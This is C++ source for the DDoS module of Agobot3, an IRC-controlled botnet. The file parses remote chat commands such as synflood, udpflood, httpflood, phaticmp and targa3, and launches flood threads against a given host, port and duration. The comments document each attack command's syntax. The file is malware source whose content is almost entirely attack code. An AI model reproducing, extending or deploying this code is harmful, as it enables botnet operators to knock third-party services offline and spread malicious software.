/*	Agobot3 - a modular IRC bot for Win32 / Linux
	Copyright (c) 2004 Ago and the Agobot team
	All rights reserved.

	This is private software, you may redistribute it under the terms of
	the APL(Ago's Private License) which follows:
  
	Redistribution and use in binary forms, with or without modification,
	are permitted provided that the following conditions are met:
	1. The name of the author may not be used to endorse or promote products
	   derived from this software without specific prior written permission.
	2. The binary and source may not be sold and/or given away for free.
	3. The licensee may only create binaries for his own usage, not for any
	   third parties.
	4. The person using this sourcecode is a developer of said sourcecode.

	Redistribution and use in source forms, with or without modification,
	are not permitted.

	This license may be changed without prior notice.

	THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY EXPRESS OR
	IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES
	OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.
	IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT,
	INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT
	NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
	DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
	THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
	(INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
	THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE. */

#include "main.h"
#include "mainctrl.h"
#include "ddos.h"

bool CDDOS::Init() { m_iNumThreads=0; m_bDDOSing=false; return true; }

/*
	.ddos.phatsyn <host> <time> <delay> <port>
	 - port 0 = random port

	.ddos.phatwonk <host> <time> <delay>

	.ddos.phaticmp <host> <time> <delay>
	  
	.ddos.synflood <host> <time> <delay> <port>
	 - port 0 = random port
   
	.ddos.udpflood <target> <port>[0=rand] <time>(secs) <delay>(ms)
	
	.ddos.httpflood <url> <number> <referrer> <delay> <recursive>
	 - delay 0 = random delay (1-24h)
	 - recursive = get page resources

    .ddos.targa3 <target> <time>(secs)
*/

bool CDDOS::HandleCommand(CMessage *pMsg) {
#ifdef __COMPILE_DDOS_PHATWONK__
	if(!pMsg->sCmd.Compare(m_cmdPhatWonk.szName)) {
		CDDOSPhatWonkFlood *pTemp=new CDDOSPhatWonkFlood; m_bDDOSing=true; pTemp->m_pDDOS=this;
		pTemp->m_sHost.Assign(pMsg->sChatString.Token(1, " "));
		pTemp->m_iTime=atoi(pMsg->sChatString.Token(2, " ").CStr());
		pTemp->m_iDelay=atoi(pMsg->sChatString.Token(3, " ").CStr());
		pTemp->m_cMsg=*pMsg;
		pTemp->Start(true); }
#endif // __COMPILE_DDOS_PHATWONK__

#ifdef __COMPILE_DDOS_PHATSYN__
	if(!pMsg->sCmd.Compare(m_cmdPhatSyn.szName)) {
		CDDOSPhatSynFlood *pTemp=new CDDOSPhatSynFlood; m_bDDOSing=true; pTemp->m_pDDOS=this;
		pTemp->m_sHost.Assign(pMsg->sChatString.Token(1, " "));
		pTemp->m_iTime=atoi(pMsg->sChatString.Token(2, " ").CStr());
		pTemp->m_iDelay=atoi(pMsg->sChatString.Token(3, " ").CStr());
		pTemp->m_iPort=atoi(pMsg->sChatString.Token(4, " ").CStr());
		pTemp->m_cMsg=*pMsg;
		pTemp->Start(true); }
#endif // __COMPILE_DDOS_PHATSYN__

#ifdef __COMPILE_DDOS_PHATICMP__
	if(!pMsg->sCmd.Compare(m_cmdPhatICMP.szName)) {
		CDDOSPhatICMPFlood *pTemp=new CDDOSPhatICMPFlood; m_bDDOSing=true; pTemp->m_pDDOS=this;
		pTemp->m_sHost.Assign(pMsg->sChatString.Token(1, " "));
		pTemp->m_iTime=atoi(pMsg->sChatString.Token(2, " ").CStr());
		pTemp->m_iDelay=atoi(pMsg->sChatString.Token(3, " ").CStr());
		pTemp->m_cMsg=*pMsg;
		pTemp->Start(true); }
#endif // __COMPILE_DDOS_PHATICMP__

#ifdef __COMPILE_DDOS_SYNFLOOD__
	if(!pMsg->sCmd.Compare(m_cmdSyn.szName)) {
		CDDOSSynFlood *pTemp=new CDDOSSynFlood; m_bDDOSing=true; pTemp->m_pDDOS=this;
		pTemp->m_sHost.Assign(pMsg->sChatString.Token(1, " "));
		pTemp->m_iTime=atoi(pMsg->sChatString.Token(2, " ").CStr());
		pTemp->m_iDelay=atoi(pMsg->sChatString.Token(3, " ").CStr());
		pTemp->m_iPort=atoi(pMsg->sChatString.Token(4, " ").CStr());
		pTemp->m_cMsg=*pMsg;
		pTemp->Start(true); }
#endif // __COMPILE_DDOS_SYNFLOOD__

#ifdef __COMPILE_DDOS_TARGA3__
	if(!pMsg->sCmd.Compare(m_cmdTarga3.szName)) {
		CDDOSTarga3 *pTemp=new CDDOSTarga3; m_bDDOSing=true; pTemp->m_pDDOS=this;
		pTemp->m_sHost.Assign(pMsg->sChatString.Token(1, " "));
		pTemp->m_iTime=atoi(pMsg->sChatString.Token(2, " ").CStr());
		pTemp->m_cMsg=*pMsg;
		pTemp->Start(true); }
#endif // __COMPILE_DDOS_TARGA3__

#ifdef __COMPILE_DDOS_UDPFLOOD__
	if(!pMsg->sCmd.Compare(m_cmdUDP.szName)) {
		CDDOSUDPFlood *pTemp=new CDDOSUDPFlood; m_bDDOSing=true; pTemp->m_pDDOS=this;
		pTemp->m_sHost.Assign(pMsg->sChatString.Token(1, " "));
		pTemp->m_iPort=atoi(pMsg->sChatString.Token(2, " ").CStr());
		pTemp->m_iTime=atoi(pMsg->sChatString.Token(3, " ").CStr());
		pTemp->m_iDelay=atoi(pMsg->sChatString.Token(4, " ").CStr());
		pTemp->m_cMsg=*pMsg;
		pTemp->Start(true); }
#endif // __COMPILE_DDOS_UDPFLOOD__

#ifdef __COMPILE_DDOS_HTTPFLOOD__
	if(!pMsg->sCmd.Compare(m_cmdHTTPFlood.szName)) {
		CDDOSHTTPFlood *pTemp=new CDDOSHTTPFlood; m_bDDOSing=true; pTemp->m_pDDOS=this;
		pTemp->m_sURL.Assign(pMsg->sChatString.Token(1, " ").CStr());
		pTemp->m_iNumber=atoi(pMsg->sChatString.Token(2, " ").CStr());
		pTemp->m_sReferrer.Assign(pMsg->sChatString.Token(3, " ").CStr());
		pTemp->m_iDelay=atoi(pMsg->sChatString.Token(4, " ").CStr());
		if(!pMsg->sChatString.Token(5, " ").CompareNoCase("true"))
			pTemp->m_bRecursive=true; else pTemp->m_bRecursive=false;
		pTemp->m_cMsg=*pMsg;
		pTemp->Start(true); }
#endif // __COMPILE_DDOS_HTTPFLOOD__

	if(!pMsg->sCmd.Compare(m_cmdStopDDOS.szName)) m_bDDOSing=false;

	return true; }

void *CDDOSBase::Run()
{	if(!(g_pMainCtrl->m_pBot->ddos_maxthreads.iValue<m_pDDOS->m_iNumThreads))
		m_pDDOS->m_iNumThreads++; StartDDOS(); m_pDDOS->m_iNumThreads--;
	return NULL; }

void CDDOSBase::StartDDOS() {
       // Override plz
}

REGOBJ(CDDOS, g_pDDOS, true, 5);
REGCMD(m_cmdStopDDOS,	"ddos.stop",				false,	g_pDDOS);
#ifdef __COMPILE_DDOS_UDPFLOOD__
REGCMD(m_cmdUDP,		"ddos.udpflood",		false,	g_pDDOS);
#endif // __COMPILE_DDOS_UDPFLOOD__
#ifdef __COMPILE_DDOS_SYNFLOOD__
REGCMD(m_cmdSyn,		"ddos.synflood",		false,	g_pDDOS);
#endif // __COMPILE_DDOS_SYNFLOOD__
#ifdef __COMPILE_DDOS_HTTPFLOOD__
REGCMD(m_cmdHTTPFlood,	"ddos.httpflood",		false,	g_pDDOS);
#endif // __COMPILE_DDOS_HTTPFLOOD__
#ifdef __COMPILE_DDOS_PHATSYN__
REGCMD(m_cmdPhatSyn,	"ddos.phatsyn",				false,	g_pDDOS);
#endif // __COMPILE_DDOS_PHATSYN__
#ifdef __COMPILE_DDOS_PHATICMP__
REGCMD(m_cmdPhatICMP,	"ddos.phaticmp",		false,	g_pDDOS);
#endif // __COMPILE_DDOS_PHATICMP__
#ifdef __COMPILE_DDOS_PHATWONK__
REGCMD(m_cmdPhatWonk,	"ddos.phatwonk",		false,	g_pDDOS);
#endif // __COMPILE_DDOS_PHATWONK__
#ifdef __COMPILE_DDOS_TARGA3__
REGCMD(m_cmdTarga3,		"ddos.targa3",			false,	g_pDDOS);
#endif // __COMPILE_DDOS_TARGA3__
